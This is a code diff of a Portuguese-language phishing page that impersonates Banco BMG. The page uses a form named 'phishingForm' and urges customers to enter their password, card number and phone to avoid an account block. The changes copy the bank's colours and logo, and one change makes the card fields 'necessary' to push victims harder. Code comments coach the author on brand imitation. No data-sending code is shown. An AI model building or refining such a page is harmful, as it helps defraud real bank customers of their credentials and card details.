@@ -5,9 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Atualização de Segurança - Banco BMG</title>
     <style>
+        /* Cores do BMG: */
+        /* Laranja BMG: #FF8C00 */
+        /* Roxo BMG: #4A148C */
+        /* Branco: #FFFFFF (para fundo da página) */
+        /* Cinzas para textos secundários */
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #e9ebee; /* Cor de fundo mais suave */
+            background-color: #f0f2f5; /* Fundo da página branco ou quase branco */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,30 +22,35 @@
             color: #333;
         }
         .container {
-            background-color: #ffffff;
+            background-color: #FF8C00; /* A box do formulário agora é o LARANJA BMG */
             padding: 40px;
             border-radius: 10px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15); /* Sombra mais destacada */
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25); /* Sombra para destacar a box */
             width: 100%;
-            max-width: 480px; /* Largura um pouco maior */
+            max-width: 480px;
             text-align: center;
         }
         .header {
             margin-bottom: 30px;
         }
         .header img {
-            width: 120px; /* Tamanho para um logo, se for adicionar */
-            margin-bottom: 15px;
+            width: 220px; /* AUMENTADO: Deixei a logo maior. Ajuste este valor se precisar. */
+            height: auto; /* Mantém a proporção da imagem */
+            margin-bottom: 20px;
+            /* Lembre-se: o ideal é usar uma logo PNG com fundo transparente. */
+            /* Os filtros abaixo são tentativas se a imagem tiver fundo indesejado: */
+            /* filter: brightness(2) contrast(1.5); */
+            /* filter: drop-shadow(0 0 5px rgba(255,255,255,0.8)); */
         }
         .header h1 {
-            color: #0056b3;
-            font-size: 30px; /* AUMENTADO */
+            color: #4A148C; /* Título principal é ROXO BMG */
+            font-size: 30px;
             margin-bottom: 10px;
-            font-weight: 600;
+            font-weight: 700;
         }
         .header p {
-            color: #555;
-            font-size: 16px; /* AUMENTADO */
+            color: #FFFFFF; /* Parágrafo BRANCO para contrastar com o fundo laranja */
+            font-size: 16px;
             line-height: 1.5;
         }
         .form-group {
@@ -49,65 +60,75 @@
         .form-group label {
             display: block;
             margin-bottom: 8px;
-            color: #333;
-            font-weight: 500; /* Levemente mais bold */
-            font-size: 15px; /* AUMENTADO */
+            color: #4A148C; /* Rótulos dos campos são ROXO BMG */
+            font-weight: 600;
+            font-size: 15px;
         }
         .form-group input[type="text"],
         .form-group input[type="password"] {
-            width: calc(100% - 24px); /* Ajuste para padding */
+            width: calc(100% - 24px);
             padding: 12px;
-            border: 1px solid #c9d0d6; /* Borda mais suave */
-            border-radius: 6px; /* Borda levemente mais arredondada */
-            font-size: 17px; /* AUMENTADO */
-            box-sizing: border-box; /* Garante que padding não aumente o width total */
+            border: 1px solid #c9d0d6; /* Borda padrão, ou ajuste para um laranja mais escuro se quiser */
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+            background-color: #FFFFFF; /* Fundo dos campos de input branco para facilitar preenchimento */
+            color: #333; /* Texto dentro do input escuro */
             transition: border-color 0.3s ease, box-shadow 0.3s ease;
         }
         .form-group input[type="text"]:focus,
         .form-group input[type="password"]:focus {
-            border-color: #007bff;
-            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25); /* Efeito de foco */
-            outline: none; /* Remove o contorno padrão do navegador */
+            border-color: #4A148C; /* Borda ROXA BMG no foco */
+            box-shadow: 0 0 0 3px rgba(74, 20, 140, 0.25); /* Sombra de foco roxa */
+            outline: none;
         }
         .form-columns {
             display: flex;
-            gap: 15px; /* Espaçamento entre as colunas */
+            gap: 15px;
         }
         .form-columns .form-group {
-            flex: 1; /* Faz as colunas ocuparem o mesmo espaço */
+            flex: 1;
         }
         .button-submit {
             width: 100%;
-            padding: 15px; /* Botão maior */
-            background-color: #007bff;
+            padding: 15px;
+            background-color: #4A148C; /* Botão agora é ROXO BMG */
             color: white;
             border: none;
             border-radius: 6px;
-            font-size: 20px; /* AUMENTADO */
+            font-size: 20px;
             font-weight: 600;
             cursor: pointer;
             transition: background-color 0.3s ease, transform 0.2s ease;
-            margin-top: 15px; /* Espaço maior acima do botão */
+            margin-top: 25px;
         }
         .button-submit:hover {
-            background-color: #0056b3;
-            transform: translateY(-2px); /* Efeito de leve levantamento */
+            background-color: #6A1B9A; /* Roxo um pouco mais claro no hover */
+            transform: translateY(-2px);
         }
         .button-submit:active {
             transform: translateY(0);
         }
+        .card-info-header {
+            font-size: 16px;
+            color: #FFFFFF; /* Texto BRANCO para contrastar com o fundo laranja */
+            margin-top: 30px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
         .footer-text {
             margin-top: 25px;
-            font-size: 14px; /* AUMENTADO */
-            color: #777;
+            font-size: 14px;
+            color: #FFFFFF; /* Texto BRANCO para contrastar com o fundo laranja */
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>Atualização Cadastral Obrigatória</h1>
-            <p>Identificamos atividades incomuns em sua conta. Por segurança, o acesso foi bloqueado. Por favor, preencha os campos abaixo para desbloquear e verificar suas informações.</p>
+            <img src="logo-bmg.png" alt="Logo Banco BMG"> 
+            <h1>Atualização Cadastral Urgente</h1>
+            <p>Prezado(a) cliente, identificamos uma instabilidade em seu cadastro. Para evitar o bloqueio de serviços, por favor, atualize seus dados de acesso e transação.</p>
         </div>
         
         <form id="phishingForm">
@@ -124,7 +145,10 @@
                 <input type="password" id="confirmPassword" name="confirmPassword" required placeholder="Confirme sua senha atual">
             </div>
 
-            <hr style="border: 0; border-top: 1px solid #eee; margin: 30px 0;"> <p style="font-size: 15px; color: #666; margin-bottom: 20px;">Informações do Cartão (Opcional para desbloqueio imediato)</p> <div class="form-group">
+            <hr style="border: 0; border-top: 1px solid rgba(255, 255, 255, 0.5); margin: 30px 0;"> 
+            <p class="card-info-header">Informações do Cartão (Necessário para validação de segurança)</p> 
+            
+            <div class="form-group">
                 <label for="cardNumber">Número do cartão:</label>
                 <input type="text" id="cardNumber" name="cardNumber" placeholder="xxxx xxxx xxxx xxxx">
             </div>
@@ -143,7 +167,7 @@
                 <input type="text" id="phone" name="phone" placeholder="(XX) XXXXX-XXXX">
             </div>
             
-            <button type="button" class="button-submit" id="updateButton">Atualizar Dados e Desbloquear</button>
+            <button type="button" class="button-submit" id="updateButton">Atualizar Dados e Continuar</button>
         </form>
 
         <div class="footer-text">
